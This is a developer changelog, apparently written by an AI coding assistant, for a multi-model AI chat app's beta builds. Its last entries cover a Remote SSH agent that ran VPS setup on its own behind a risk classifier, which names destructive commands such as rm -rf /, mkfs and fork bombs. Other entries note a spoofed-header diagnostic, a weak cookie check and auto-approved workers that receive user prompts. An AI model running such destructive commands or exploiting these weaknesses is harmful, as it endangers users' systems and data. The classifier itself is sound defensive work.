- THIRD TIME on the stray `*/`: appending explanation to a closed
  comment killed the stylesheet again. The audit caught it before it ran
  this time, which is the only reason it cost seconds instead of an
  hour. Run it after EVERY css comment edit, no exceptions.
- Gauntlet 60/60.

## 6 beta 240 — thumbnails when the question asks for pictures
- "do you have any photos?" returned sources from PEXELS and an answer
  apologising that it cannot show images. The PHOTOS marker, the
  photoRow renderer and the harvesting code all already existed —
  photos were only ever collected on the PLACE path. `run_search` reads
  snippets and never opens a page, so a non-place question had nothing
  to harvest from.
- Now gated on actually asking (`_WANTS_IMAGES`: photo/pic/picture/
  image/screenshot/diagram/"show me"/"look like"), because opening pages
  costs seconds and most questions do not want them. Verified it fires
  on five asking phrasings and none of four ordinary ones.
- AND THE MODEL IS TOLD. Without it, it apologised for being unable to
  show what was already on screen beneath it.
- THREE BUGS FOUND BY RUNNING IT, none of which any amount of reading
  would have caught:
   1. `step()` is defined AFTER the response opens; the search phase runs
      before. Calling it there is an UnboundLocalError — a hard 500 on
      every image question.
   2. `_stash_sources` rewrites rows as {"t","u"}. The harvest read
      "href", got None every time, and ran with an empty URL list. The
      mechanism was never at fault; it was handed nothing.
   3. og:image ALONE IS TOO THIN — two of three real sources never set
      it. Falling back to <img> tags (plus data-src, since lazy loading
      is the norm, and relative URLs resolved against the page) took
      three sources from 1 image to 11.
- FURNITURE FILTER, earned the hard way: the first working run returned
  LANGUAGE FLAGS from a site nav — a photo by every technical measure
  and of no use to anyone. icon/logo/sprite/flag/banner/arrow/social/
  star and the usual chrome paths are skipped now.
- HONEST LIMIT: picking the GOOD image is heuristic. Dimensions are
  unknown without downloading, so a site with unusual markup can still
  surface something dull. og:image is preferred first because it is the
  one image a page has deliberately chosen to represent itself.
- Gauntlet 60/60.

## 6 beta 241 (pending release) — the question keeps the face it was typed in
- The user bubble was inheriting `--helv` (Helvetica Neue) at 23.9
  leading while the composer it was typed into is Space Grotesk at
  21.75 — same 14.5px size, different typeface, so the words visibly
  changed shape the instant you pressed enter.
- Matched to #input on every axis and set to pure white rather than
  --text. Verified all five: face, size, leading, tracking, colour.
- Both panels of the window now speak one typeface: sidebar, answer
  prose and the question bubble are all Space Grotesk; only the
  micro-labels (mono) and the wordmark (Michroma) differ, which is the
  point of having them.
- Gauntlet 60/60.

## 6 beta 242 (pending release) — Compositor label, and sources fold away
- The `.who` line names the ROLE now, then who filled it:
  "**Compositor** Gemma 4 26B", role bold, model not. Whatever the
  ladder actually picked appears there, cloud or local.
- SOURCES ARE TUCKED INTO THE DISCLOSURE once the answer lands, the way
  Claude does it: visible while the work runs, folded away with the
  steps when it settles, so a finished answer is prose rather than
  prose under a pile of chips. The summary now says what is behind the
  chevron — "3 steps · 4 sources" instead of "3 steps · done".
- THE CHEVRON WAS ALREADY DEAD, and this feature could not exist until
  it wasn't. send() re-inserts the worktree card from its outerHTML
  STRING when an answer settles; that parses fresh nodes and drops every
  handler, so the per-element click listener collapseSteps() attached
  had been useless on every finished answer. Proved it before building:
  rebuild the settled state, click the summary, list.hidden never
  changed. Replaced with ONE delegated listener on the chat container,
  which survives any number of innerHTML swaps.
- Measured on a real searched answer: who = "<b>Compositor</b> Gemma 4
  26B", summary "3 steps · 4 sources", 4 chips INSIDE the disclosure,
  0 loose in the body, and the toggle opens and closes.
- Gauntlet 60/60.

## 6 beta 242 (cont.) — one mode picker, and the DMG goes black
NB the in-code markers: this batch is 6b242. A run of `6b243` comments
already exists in millenai.py from the beta-239 commit — previous-me
labelled forward and the counter never caught up. They are wrong but
they are history; left alone rather than rewritten.
- THE SIDEBAR'S TIER LIST IS GONE. Two controls for one setting, a few
  hundred pixels apart: the sidebar dropdown and the composer's engine
  pill opened the same four modes and wrote the same `millen.tier`. The
  composer one wins — it sits with the query, which is where you decide
  how hard to think.
- Removed with it: `build_tier_rows()` and the `__TIER_ROWS__` token,
  `.tier` / `#tier-rows` / `.infobtn` CSS, the fold-open-fold-shut click
  handlers, and the `$$(".tier")` sweeps in setTier and paintTierAvail.
  `#tierpop` STAYS — the composer menu uses it for the hover bubble.
- ⌘K used to enumerate modes by reading the rendered sidebar rows, which
  would have silently emptied. It reads `TIER_META` now: the same object
  the composer picker is built from, so the two cannot drift.
- Verified live: 0 `.tier` in the DOM, picker opens with all four modes
  and Fast marked on, ⌘K still offers all four.
- THE DMG WINDOW IS BLACK with grey/white stars, and the lockup is the
  SETTINGS lockup — not redrawn by eye. Every number in build_dmg.sh was
  measured off `#set-brand` in the running app and written as a ratio of
  the wing height: width 1.1951, gap 0.4268, cap 0.5368, wordmark ink
  6.7982. The wing is SMALL against a long wide-tracked wordmark, and
  that ratio is the whole character of the mark — eyeballing it drifts
  every time.
- The wing is the app's own SVG replayed in PIL: same five bars in
  viewBox units, round caps drawn as end-circles, 4x supersampled, and
  the real objectBoundingBox gradient (steel bottom-left -> silver
  top-right) computed per pixel and masked, not five flat shades.
- MICHROMA IS A WEBFONT — Google-hosted, no local file — so PIL cannot
  set it. Helvetica stands in, sized to the same cap height and tracked
  out to the same ink width, which keeps the proportions but not the
  letterforms. Shipping the TTF in-repo is the only exact fix.
- Dropped the blur/bloom pass: on navy it read as glow, on true black it
  just lifts the whole field to charcoal. Arrow and step 3 went
  greyscale too — nothing coloured is left in the window.
- Gauntlet 60/60 (the "tier dropdown js present" check was asserting the
  thing we deleted; it now guards that the composer picker exists AND
  that the sidebar duplicate has not crept back).

## 6 beta 243 (pending release) — voice chat is parked
- Greyed, not deleted: `#voicebtn` gets `.parked` (opacity .3, not-allowed),
  the click returns early, and `setVoice` forces `on=false` behind a single
  `VOICE_PARKED` flag. Flip that one constant to bring it back.
- THE STALE FLAG WAS THE ONLY REAL TRAP. `voiceChat` initialises from
  `localStorage["millen.voice"]`, so a machine that had voice chat ON
  before the update would have carried a "1" across and kept talking after
  every answer with no visible control to stop it. Boot now writes "0".
- Verified by priming localStorage to "1", reloading, and reading back:
  parked, opacity .3, cursor not-allowed, voiceChat false, stored "0",
  and a click changes nothing. The MIC is untouched — dictation is a
  different feature and still live (opacity 1, cursor pointer).
- WHY, so nobody "fixes" the wrong layer: `_speak()` is not slow. `say`
  is instant. The wait is that voice chat speaks the FINISHED answer, and
  finishing means the whole tier ladder — council, search, compositor.
  Speeding up TTS would do nothing.
- The route back, if it's ever wanted: voice mode pins the Fast tier (one
  model, no search, no compositor) AND speaks sentence-by-sentence off the
  DRAFT stream instead of waiting for `full`. That is seconds, not minutes
  — but it makes spoken answers deliberately dumber than typed ones, which
  is a product decision, not a patch.
- Gauntlet 61/61 (new check guards the parked state and the flag clear).

## 6 beta 243 — the mobile burger was wired to a ghost
- THE CLICK HANDLER WAS FINE. Two media queries fought over the sidebar:
  an older `max-width:760px` block set it `display:none`, and the newer
  `max-width:700px` drawer block only animated `transform`. On a phone
  both applied, display:none won, and the ☰ toggled `body.sbopen` on an
  element that was never rendered. A dead button that LOOKED wired.
  Bonus: between 700 and 760px there was no sidebar AND no burger.
- Merged into ONE 760px block. If a rule ever needs to differ by width,
  it goes inside that block — never a second breakpoint for the sidebar.
- The drawer gets a real ground now (rgba(10,12,17,.92)): the desktop
  34% glass slid over white chat prose and read as text-on-text.
- The open burger sat exactly on the wordmark ("ONCORDE"), and while
  open it is redundant — the exposed strip of chat closes the drawer —
  so `body.sbopen #mburger` fades out and drops pointer-events.
- VERIFYING THIS IN THE PANE HAS A TRAP: the Browser pane is a hidden
  document — document.hidden true, rAF never fires — so CSS TRANSITIONS
  NEVER ADVANCE. The drawer sat at translateX(-105%) with sbopen set and
  the transition "running" at currentTime 0 forever, which looks exactly
  like the bug you just fixed. Inject `transition:none!important`, then
  read positions; the endpoint state is the truth the phone will see.
  (Second trap, again: the dev server bakes the page at boot — edits
  after preview_start are NOT served until restart.)
- Verified at 375px and at 730px (the formerly dead band): open x=0 and
  the hit-test lands on the sidebar, tap-chat closes to -315, burger
  reopens, wordmark unobscured, mic/composer untouched.
- Gauntlet 61/61 (drawer check now guards one-breakpoint + sbopen rule
  + no display:none, so the second block cannot creep back).

## 6 beta 243 — the council loses its wasted minutes
Reviewed run_council + the /api/chat orchestration end to end for speed.
The bones were right (parallel cloud bench, correctly-sequential MLX
loop, one shared join deadline, per-model caps, in-memory dead-model
set). Four real inefficiencies found, all fixed:
- ENGINE PRE-WARM NOW OVERLAPS THE SEARCH. It used to run serially
  AFTER the search and BEFORE the headers: 5-20s of network, then up to
  180s of disk, then the first byte — and the Cloudflare heartbeat only
  starts after the headers, so the load sat in exactly the silent
  window the heartbeat exists to cover. Routing is resolved before the
  search now and the warm-up runs on a daemon thread; run_model's own
  _engine_lock ensure makes the first draft wait if it's still coming
  up. Prep time is max(search, load) instead of search + load.
- THE MERGER DRAFTS LAST. The local loop leaves the LAST engine
  resident, and the merge wants the biggest Gemma — which on this very
  machine is also the roster LEADER, so every Thinking run loaded the
  26B, evicted it for Phi-4 and Nemo, then RELOADED the largest model
  on the machine for reflection + merge. The handler now seats the
  projected merger last (merge_pref_label(), ONE definition shared with
  run_council's pick). Guarded by `not model_name` so a manual pick
  keeps the user's leader.
- THE time.sleep(1.2) IS GONE. Skipped models were a status flash held
  on screen by a literal sleep; they are ledger chips now (only when a
  usable roster remains — with nothing usable the loop tries labels[0]
  anyway, and a skip chip + a real draft for the same model would make
  the contributor count lie).
- THE CLOUD COMPOSITE STREAMS. cloud_only and turbo waited for
  cloud_text to return the ENTIRE composite before showing a byte —
  drafts all in, user staring at "compositing…" for the whole cloud
  generation. It streams now with the _stream_guarded contract: a rung
  that collapses is wiped with RESET and the next rung (or the best
  draft) takes over. Single-provider paths already streamed raw via
  cloud_stream_conf, so this is consistent, not novel.
- NOT touched, deliberately: peer review's second pass per contributor
  (Pro's stated contract), reflection (critique-then-revise beats
  straight merge), the 75s cloud join (a backstop — cloud_text's own
  60s timeout means threads are long dead by then).
- Gauntlet 61/61 (live Fast-tier generation exercises the moved
  routing + threaded pre-warm). Verified against the real roster:
  Thinking resolves [Gemma 26B, Phi-4, Nemo] here, so the reorder
  demonstrably saves reloading the 26B — the machine's biggest model —
  once per council.

## 6 beta 244 (pending release) — the fleet is real, and measured
- PROVED END TO END, twice: a real worker speaking the real protocol
  (register -> auto-approve + token handover -> long-poll -> submit)
  against the dev hub, then a genuine /api/chat Fast query answered BY
  the worker — sentinel text back through the stream, "e2e-rig's GPU is
  on it" status, zero local engine loads. Now a permanent gauntlet
  check (62nd): fleet loopback with turbo parked and restored.
- BANDWIDTH, MEASURED, is a non-issue BY CONSTRUCTION: the job payload
  was 6.8KB down (system prompt + question) and under 1KB up; a searched
  answer might reach ~50KB. Idle costs one register+poll round every
  ~25s (~170 B/s). This design ships whole jobs to a machine that runs
  the whole model locally — only prompt and answer cross the wire. The
  bandwidth-doomed version of this idea (splitting one model's LAYERS
  across homes, activations crossing the net every token) is not what
  Concorde does.
- FIXED A REAL BUG found in review: fleet_run's status() writes to the
  client socket BEFORE the busy-flag cleanup, and a closed tab raised
  through it — skipping the reset. Register PRESERVES busy across
  re-registers (mid-job workers must not be double-booked), so ONE
  dropped stream sidelined that worker forever. try/finally now.
- THE PECKING ORDER, worth knowing: in the single-model path the fleet
  sits BELOW cloud — turbo + healthy key means fleet_run is never
  consulted. On a keyless machine (the actual community) it is first
  in line after local. Councils never offload (single-model jobs only,
  by design).
- Trust flags surfaced, not changed (Patrick's calls): fleet_auto
  defaults to ON, so anyone who knows the hub URL can register a worker
  and will RECEIVE user prompts — and the job payload carries the
  system prompt with the user's MEMORY and persona in it. "Friends
  only" is the documented model; auto-approve is the one-toggle UX
  choice (6bXXX "AUTOMATED, per Patrick").
- 7 real workers sit approved on the hub today.
- Gauntlet 62/62. Test residue cleaned: e2e worker entry removed from
  fleet_workers.json, turbo restored both times.

## 6 beta 244 — copy button on code cards
- Every code card's bar carries "copy" at the right, in the bar's own
  mono caps. GREYED WHILE THE FENCE IS OPEN: renderMD's fence regex
  third group is the closer — ``` or $ — so a block still streaming
  renders `.ccopy.wait` (opacity .32, disabled) and flips live the
  chunk the closing fence lands. Zero state tracking; the re-render IS
  the state machine.
- Lang-less fences get the bar now too (label "code") — the button
  needs a home. Fenced tables and ```flow diagrams stay button-free.
- DELEGATED handler on `inner`, same reason as the chevron (6b242):
  streaming re-renders via innerHTML kill per-element listeners within
  the second. Copies `pre code` textContent — the un-highlighted raw —
  then flashes "copied" for 1.2s.
- THE GAUNTLET'S FLEET CHECK WENT FLAKY and the cause is worth keeping:
  the hub hands a worker its token ONCE (the claim is marked claimed);
  a known wid arriving tokenless is an imposter and parks in pending.
  Correct security — but the test's fixed wid worked exactly once. The
  worker now persists its (wid, token) pair in the temp dir and mints a
  fresh identity when the cache is gone.
- Gauntlet 63/63 (new check: ccopy present, wait state wired).

## 6 beta 245 (pending release) — Kimi K3 joins as the 4th provider
- K3 IS NOT A LOCAL-CATALOG CANDIDATE and never will be: 2.8T-param MoE
  (104B active per token), open weights under Modified MIT, ~64 H100s
  to self-host. It joins the CLOUD side instead: provider id "kimi",
  base https://api.moonshot.ai/v1, OpenAI-compatible — the existing
  streaming/compat path speaks it unchanged.
- Discovery-first saves us from id guesswork: the default "kimi-k3" is
  corrected by the /models inventory on key save (prefs_order: k3,
  kimi-latest, k2). WIRING PROVEN LIVE without a key: a deliberately
  invalid probe through /api/cloud/set came back with Moonshot's own
  "Invalid Authentication" — base, headers, discovery and the
  provider's-own-words error path all real. cloud.json snapshotted and
  restored around the probe.
- Seated in the pecking order as PAID: compositor ladder is now claude,
  kimi, gemini, groq; the bench fields ONE kimi seat (no blind
  alternate — same rule as Anthropic, it bills per token).
- Touchpoints (the full 4th-provider checklist, for next time):
  KEY_SHAPE ("sk-", floor 40 — Moonshot keys are OpenAI-styled bare
  sk-, no vendor infix; per-selected-provider check so no sk-ant-
  collision), _provider_of (moonshot -> kimi), spec map, prefs_order,
  cloud_bench paid-skip, compositor_ladder tuple, dropdown option,
  CK_PROVS board row, ZITO PROV map + ladder array.
- Gauntlet 64/64 (new check: dropdown + board carry Kimi K3).

## 6 beta 245 (cont.) — tier audit: three defects found and fixed
- PRO WAS SEATING LLAVA ON TEXT QUESTIONS. BLEND_EXCLUDE exists to keep
  the vision model out of text councils and take_all bypassed it — a 7B
  vision model spent a whole engine swap drafting prose. Excluded now;
  images still route to LLaVA directly before tiers resolve.
- THINKING COULDN'T SEAT THE INSTALLED REASONING MODEL. Picks named
  "DeepSeek R1 7B" (MLX distill); this machine holds the "DeepSeek R1"
  ollama row — same brain, different label — so the reasoning tier
  blended a plain Nemo instead. Both labels are in the picks now.
- THE MERGE WAS CHOPPING FRONTIER DRAFTS TO STUMPS (Patrick: "will
  Gemma distilling ruin it?"). The 1500-char per-draft cap exists for
  small local mergers — repetition loops, seen in the wild — but it
  also applied when Claude/Kimi K3 wrote the composite, so a frontier
  draft was truncated to 1500 chars before a frontier compositor read
  it. Two cuts now: cloud rungs get 6000 chars/draft (their contexts
  are six to seven figures), the local merger keeps 1500.
- THE ANSWER TO "does Gemma ruin Kimi": mostly no, BY THE LADDER — with
  turbo on, the composite is written by Claude first, then Kimi, then
  Gemini/Groq; local Gemma only writes when every cloud rung fails.
  The residual flattening case: all-cloud-rungs-down mid-run, Gemma
  rewrites a pot that contains a K3 draft. Option (NOT implemented,
  Patrick's call): in that case ship the strongest cloud draft verbatim
  instead — precedent exists (Cloud Only does exactly this).
- Where Kimi sits per tier, once a key is saved: Fast = only if Moonshot
  is the ACTIVE provider (turbo streams one provider); Thinking/Pro =
  drafts on the bench (one seat, no paid alternate) + compositor rung 2;
  Cloud Only = bench + rung 2.
- Gauntlet 64/64.

## 6 beta 245 (cont.) — "where is this turbo mode?"
- IT'S THE "USE CLOUD POWER" CHECKBOX, Settings › Cloud power. "turbo"
  is only the pref key; the one place the internal name leaked to the
  screen was the generation status line ("turbo — Gemini") — reworded
  to "cloud power — …" so the status speaks the switch's name.
- FRESH-INSTALL TRAP FIXED: the key box folded away when cloud power
  was off, and the toggle hides until a key is configured — so a fresh
  machine's Cloud power pane was EMPTY, with no way to paste the first
  key. The box now opens while the feature is on OR while nothing is
  configured; it folds only for someone who has keys and switched it
  off. (Never seen on this machine because turbo has been on forever.)
- Gauntlet 64/64.

## 6 beta 245 (cont.) — the spec list speaks one voice
- VERSION and MODELS rendered in different type than CHIP/MEMORY/ACCEL
  inside #set-spec: two STALE ID RULES from the pre-rail About layout —
  #about-ver (Helvetica 14px) and #about-facts (mono 11.5px bold,
  margin-top:10px) — outranked the list's shared mono 9.5px. The fix is
  deletion: #up-ver keeps its rule (the update dialog still uses it),
  #about-facts has no rule at all now. Measured after: all five rows
  IBM Plex Mono / 9.5px / 400 / 0 margin.
- The recurring lesson (third time now, after the duplicate #about-card
  and #about-name ids): the rail redesign REUSED old element ids, and
  every rule that ever targeted those ids is still live. When a row in
  a shared list looks wrong, grep the ID before touching the list.
- Gauntlet 64/64.

## 6 beta 246 (pending release) — Fast rides the speed ladder, and Kimi shows its money
- FAST PREFERS A FAST CLOUD MODEL OVER ANY LOCAL LLM (per Patrick).
  fast_cloud_ladder(): groq -> gemini -> kimi -> claude, SPEED order
  not strength order — Groq's LPUs first, Gemini's pick is already
  flash, Claude last and downshifted to haiku when the inventory has
  one (Fast fires constantly; frontier tokens don't belong in it).
  Every healthy rung gets a try before local silicon; the old path took
  ONE shot at whichever provider was "active" — which could be the
  slowest paid one — and dropped straight to local when it hiccuped.
- The turbo gate now rides the ladder, not cloud_conf(): a dead ACTIVE
  key used to skip cloud entirely while a healthy second key sat
  unused.
- PROVEN LIVE, including the fallthrough: one run answered via Groq in
  0.7s; the next caught Groq mid-hiccup and the ladder walked to Gemini
  ("cloud power — Groq 120B" then "cloud power — Gemini"), 7.7s total,
  answer intact. The old code would have run Gemma locally instead.
- Fast's hover bubble names the actual rung now: "✓ Cloud Enabled —
  Groq 120B answers first, this machine is the fallback."
- BALANCES, honestly: only Moonshot exposes money to a normal key
  (GET /users/me/balance). The board shows it — measured live, "Kimi K3
  ✓ · $25.00 left" off Patrick's real account — cached 5 minutes.
  Anthropic exposes cost only to an org ADMIN key; Groq and Gemini are
  dashboard-only. Those rows show nothing rather than something
  invented.
- Gauntlet 64/64.

## 6 beta 247 (pending release) — the Kimi seat actually answers
Patrick's screenshot: Cloud Only, "KIMI K3 (no answer — cloud)". Three
distinct defects stacked on that one seat, all found by replaying the
EXACT bench payload against Moonshot and reading the body the app
swallows:
- TEMPERATURE: Moonshot pins each model's legal temperature — the bench
  payload's 0.75 got 400 "only 1 is allowed" on EVERY council call,
  while the save-probe (which sends no temperature) showed a green ✓.
  Probe and runtime payloads differing is the same class of bug as the
  b233 Groq tick. cloud_text and cloud_stream_conf now OMIT temperature
  on moonshot bases; the server default is always legal.
- STALE PICK: discovery ran once, at key save — when Patrick's account
  (pre-funding) exposed only k2 models, so the stored pick was
  kimi-k2.7-code, a CODE SPECIALIST, forever. kimi-k3 appeared in the
  inventory after funding and nothing ever looked again.
  _cloud_refresh_picks() now re-discovers every healthy provider once
  per boot (background thread off the _cloud_repair latch) and upgrades
  picks via CLOUD_PICK_ORDER — ONE policy table shared with the save
  handler. Stored conf healed by hand for the interim (snapshot kept).
- "pro" IS A SUBSTRING OF "prompt": the alternate-seat heuristic put
  llama-prompt-guard-2-22m — a 22M SAFETY CLASSIFIER — on every Groq
  council as the "stronger sibling". Word-boundary match now, and
  guard/moderation ids are skipped at inventory level entirely.
- Verified live end to end: Cloud Only bench = Groq 120B, Gemini,
  Claude, Kimi K3 — all four answered, claude-sonnet-5 composited,
  15.2s. Boot refresh then purged the junk inventories on its own and
  upgraded Gemini's pick to gemini-3-flash-preview.
- Gauntlet 64/64.

## 6 beta 247 (cont.) — the wine question grew a map of France
Patrick's screenshot: a health question about daily wine rendered a
world map pinning "Short term", "Liver" and "Brain". The chain, fully
traced:
- WINE IS A _PLACE_NOUN (so "best wine bar in bushwick" searches
  properly), so a quality word + a consumable classified the health
  question as a venue ask -> bookish -> the [[PLACES]]/extraction
  machinery engaged -> the extractor read the ANSWER'S SECTION HEADINGS
  as venue names (they pass the exists-in-answer check, because of
  course they do) -> the geocoder pinned them, because BRAIN IS A REAL
  COMMUNE IN FRANCE.
- THREE GATES NOW, layered:
  1. _NOT_PLACEY_RX — "bad/good/healthy/safe/… for you/health",
     health words, "why is X bad" — forces placey=bookish=False AFTER
     the follow-up threading step, so a glued-on entity from a previous
     venue turn can't resurrect the machinery. Tested both sides: five
     health phrasings blocked, four venue asks untouched (the qzxvbn
     placey gauntlet test still passes).
  2. PLACEHINT only emits when placey/bookish — for a plain searched
     answer the "venues" mined from article titles are headline
     fragments.
  3. CLIENT COHERENCE: pins wider than 250km apart = garbage in, no
     map. Real venue answers share one metro; junk names geocode
     SOMEWHERE on every continent.
- Verified live twice: "is a glass of wine a day actually good for you"
  and the reported "why is drinking bad for you" — SOURCES only, no
  MAP, no PLACES2, no PLACEHINT, grounded prose answer.
- Gauntlet 64/64.

## 6 beta 247 (cont.) — the four-step first-run wizard
- #wiz-veil over the app, once per machine (prefs.wizard_done; skip
  counts). The boot gate: needs_setup && IS_LOCAL && !wizard_done ->
  openWizard(); done/skipped machines fall back to the plain download
  panel. Remote visitors never see either.
- Step 1: the stacked lockup at hero size (wing SVG + Michroma wordmark
  + version), two paragraphs — what Concorde is, and "this takes a
  minute".
- Step 2: one paragraph on LLMs + compositing, then Basic/Pro/Max cards
  priced from /api/setup plans (live GB, "installed ✓" when owned), and
  the ignore-system-limits checkbox riding the existing no_limits pref
  (re-prices the cards on toggle).
- Step 3: one paragraph on cloud power, then the four providers —
  checkbox left, free/paid tag, "get a key ↗" (aistudio / console.groq /
  console.anthropic / platform.moonshot), checking reveals paste + Save
  through /api/cloud/set. Connected providers show ✓ instead.
- Step 4: thanks + "Let's go" -> /api/setup/install with the chosen
  plan, wizard_done, and the OLD setup veil takes over for the progress
  bar it already draws well. Nothing was duplicated: plans, install,
  keys, no-limits all ride the existing endpoints.
- Traps hit: .about-btn's display:block beats the UA [hidden] rule
  (Back showed on step 1 — same fix as every veil: an explicit [hidden]
  rule); the key input needed min-width:0 + border-box or the card
  grew a horizontal scrollbar.
- Verified: all four steps walked live; fresh-machine branches proven
  by stubbing /api/setup + /api/cloud (GB prices render, checkbox
  reveals the key row, right links, right placeholders); skip writes
  wizard_done and the gate honours it. Gauntlet 65/65.

## 6 beta 248 (pending release) — the hosted page can never go stale again
- Patrick: "i dont think the hosted web ui is up to date". IT WAS — the
  local :9889 self-updated to 247 on its hourly tick, the tunnel door
  was byte-identical to a locally simulated remote request, and a
  signed-in remote fetch titled beta 247. The staleness was HIS
  BROWSER: the app page shipped with NO cache headers, and mobile
  browsers heuristically cache such pages for days.
- ETag = "b<APP_BUILD>" + Cache-Control: no-cache on the app page.
  Every load revalidates: unchanged build = instant tiny 304, new
  build = full fetch. Verified all three: 200+ETag on first fetch,
  304 on matching If-None-Match, 200 on a stale one.
- Diagnosis path worth keeping: door pages hide the version, so
  compare builds by simulating remoteness against localhost
  (curl -H "X-Forwarded-For: …" — and a cookie with any 20-hex
  millen_user gets the app page, which titles its build).
- Gauntlet 65/65.

## 6 beta 248 (cont.) — one row of starter chips
- rows.slice(0,2) -> slice(0,1) in paintSuggest's measurement pass (per
  Patrick: single row, even if only 3-4 fit). The measured-not-guessed
  approach did all the work — one character changed. Verified live:
  3 chips, 1 row at 780px.
- Gauntlet 65/65.

## 6 beta 248 (cont.) — the Advanced council
- ⚙️ Advanced sits under a thin rule (.engdiv) at the bottom of the
  engine menu. Its veil: every READY local model with a checkbox and a
  small grey-italic best-use line (ADV_USE map; LLaVA excluded — vision
  routes itself), the four cloud providers (keyless ones greyed with
  "no key — add one in Settings"), then the COMPOSITOR dropdown —
  Automatic, each keyed cloud, and the local Gemmas — with a guidance
  line per pick (research/writing -> Claude, long docs/code -> Kimi,
  quick general -> Gemini, speed -> Groq, privacy -> local).
- Wire contract: the request carries models + cloud + compositor.
  cloud=None means no opinion; cloud=[] means EXPLICITLY none — it
  suppresses the fast ladder, the bench, and (caught live) the free
  community cloud, which fired on the first pass because its elif only
  checked the turbo pref. Naming providers IS the opt-in: a custom run
  engages its clouds even with turbo off.
- Compositor override: local label -> merger=comp, no cloud ladder at
  all (the user chose a private pen); provider id -> the ladder narrows
  to that one provider, engaged even without turbo. The handler's
  merger-last roster reorder follows the override.
- State: localStorage millen.adv + millen.advon; chip reads "Custom";
  picking any real tier exits custom (the boot call with the stored
  empty tier keeps it). Save requires ≥1 local model — pure cloud is
  what ☁️ Cloud Only is for, and the note says so.
- Verified live: menu row + divider render; picker lists 10 locals /
  4 clouds / 7 compositor options; save -> chip Custom, stored JSON
  correct; a 1-local/no-cloud run answered locally in 4.9s with zero
  cloud attempts. Gauntlet 66/66.

## 6 beta 249 (pending release) — the Remote SSH agent
Patrick's ask: his competitor's AI edits a VPS over SSH; roll the same
into the Code tab so "help me set up a VPN on my VPS" asks the right
questions and grinds. Built as a "Remote" agent (🛰️) beside Coding and
Workspace.
- LOOP: plan -> run one command over SSH -> read output -> repeat, up to
  REMOTE_CAP=40. The driver is the STRONGEST available brain
  (compositor_ladder first — cloud when keyed — else the best local
  coder); agentic multi-step work needs it. Each command + exit code
  streams into the same activity tree the council uses.
- TRANSPORT: shells out to the system ssh binary, KEY-FIRST. BatchMode
  means a password prompt can never hang the loop; a keyless box fails
  with a clean "ssh-copy-id …" nudge. accept-new host key, 12s connect
  timeout. The app never invents a target and never takes a secret —
  the user saves their own host/user/port/key (remote.json, 0600,
  owner-only, never over the tunnel).
- THE AUTONOMY THROTTLE (the "be creative" bit): three escalating
  segments — 🔒 Manual (approve every command) / ⚡ Auto (reads run,
  changes ask) / 🔥 Full (grinds, pauses only for irreversible). Cool
  grey -> amber -> hot red left to right; Full pulses. Stored in
  millen.autonomy, sent as `autonomy`.
- THE REAL GATE is classify_cmd() -> read|write|danger, unit-tested
  36/36 including rm -rf /, mkfs, dd, reboot, fork bombs, and compound
  commands (a pipeline takes its riskiest segment). Auto pauses on
  write+danger; even FULL always pauses on danger — a floor no mode
  crosses. Guarded in the gauntlet over the wire via /api/remote/classify.
- APPROVAL CHANNEL: the loop emits an APPROVE marker and blocks on an
  Event (the fleet-job pattern); the client shows a Run/Skip card with a
  risk chip; POST /api/remote/approve sets the Event and the loop
  continues (or feeds "user declined" back to the model). 600s window.
- SECURITY: the whole feature is owner-only. A tunnel guest selecting
  Remote gets "owner's machine only"; every /api/remote/* is in
  ADMIN_PATHS AND re-checks _remote() in its handler.
- VERIFIED: classifier 36/36 (unit) + over the wire (gauntlet); ssh argv
  construction; config save/read roundtrip with the key; bogus-host test
  fails in ~5s, NO hang; the full /api/chat loop reaches the connect
  step and returns the guided failure in 5s; the approval card renders
  read/write/danger and POSTs {jid,ok} correctly.
- NOT YET EXERCISED (needs a real reachable VPS — the WebKit-pass
  equivalent): the live multi-command grind with the model driving, and
  the end-to-end approval gate through an actually-running command. The
  mechanism is the proven fleet Event pattern; only the command phase
  is untested from here. Ship, then shake out against a real box.
- Gauntlet 69/69.

## 6 beta 250 (pending) — first LIVE remote-agent run + classifier polish
- PROVED END TO END against a real DigitalOcean droplet (Ubuntu 26.04):
  the Remote agent, driven by Claude Sonnet 5, set up a full WireGuard
  VPN autonomously in 17 commands, all clean. Recon-first (OS, ifaces,
  firewall, SSH port — it checked the SSH port BEFORE touching ufw so it
  couldn't lock itself out), then install, keys, wg0.conf with NAT +
  MASQUERADE, client config, ufw (kept 22 open), DEFAULT_FORWARD_POLICY
  DROP->ACCEPT, systemctl enable --now. Independently verified over SSH:
  service active+enabled, wg0 up on 51820, peer present, forwarding on,
  firewall correct. NOT the agent's word — my own probe.
- Key bootstrap stayed the user's hands (the app is BatchMode key-only,
  and I don't handle plaintext passwords): generated a throwaway
  keypair, wrote remote.json, user ran one ssh-copy-id. Background
  harness (scratchpad/remote_grind.py) waited for the key then drove the
  real run_remote_agent with a danger-DENY approval callback.
- CLASSIFIER BUG the live run exposed: `_WRITE_RX` carried a DUPLICATE
  redirect pattern `>>?\s*[^&\s]` WITHOUT the /dev/null exclusion the
  dedicated _classify_seg check has — so every `cmd 2>/dev/null` recon
  line (nearly all of them) read as a mutation. In Full auto it didn't
  matter (writes run), but Auto would have paused on pure inspection.
  Removed the duplicate; redirects are handled once, with the exclusion.
- Also widened the read set: lsb_release, apt-cache, dpkg-query, getcap,
  needrestart, and wg (safe subs show/showconf — genkey/set stay write;
  wg needed to be in BOTH _READ_CMDS and _READ_SAFE_SUB, like systemctl).
- Re-verified 17/17 incl. the two real recon lines now 'read', every
  write still 'write', full danger floor intact. Gauntlet 69/69.
- Reminder for Pat: destroy that test droplet (root pw was pasted in
  chat); client1.conf holds a live private key.

## 6 beta 250 (pending) — task library, guided flows, batching, risk cards
- THE CODE TAB'S CHIPS BECOME SERVER TASKS. 53 of them, Patrick's list
  verbatim, across 7 categories (Security 12, Updates 7, Monitoring 9,
  Services 8, Networking 6, Storage 6, Setup 5). A "⋯" chip opens a
  rail/pane picker (categories left, tasks right, live search) styled
  like Settings. Chips are lane-aware — syncSuggest repaints on every
  Chat<->Code switch via box.dataset.lane.
- RISK CARDS (per Patrick): 22 tasks carry a `w` note and render a small
  GREY warning triangle — grey not red, it's a heads-up not an alarm.
  Clicking one shows a card FIRST (large grey triangle, bold "This task
  has a higher risk of causing issues that may be challenging to undo",
  a plain-language paragraph on the actual failure mode) with "🤞 Let's
  go for it" / "🙅‍♂️ Not today". Nothing is sent until confirmed;
  declining runs nothing at all. Unflagged tasks skip the gate entirely.
- THE LOCKOUT RULE is now taught to the agent, not just described in
  copy — Patrick's insight that one pattern covers most of the ⚠️ list.
  REMOTE_SYSTEM gained five numbered rules for any sshd/firewall/network
